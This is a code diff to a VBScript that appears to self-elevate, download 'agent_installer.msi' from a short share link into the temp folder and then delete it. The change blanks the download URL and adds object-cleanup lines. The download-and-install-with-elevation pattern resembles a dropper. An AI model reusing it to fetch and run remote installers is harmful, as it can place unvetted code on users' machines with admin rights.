@@ -163,7 +163,7 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "https://share.google/dDynM21vQuy0Qvc4Z"
+strUrl = ""
 strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
@@ -195,3 +195,9 @@ If objXMLHTTP.Status = 200 Then
     ' Cleanup
     Set objFSO = CreateObject("Scripting.FileSystemObject")
     If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
+End If
+
+' Final cleanup
+Set WshShell = Nothing
+Set Fso = Nothing
+Set NetObj = Nothing
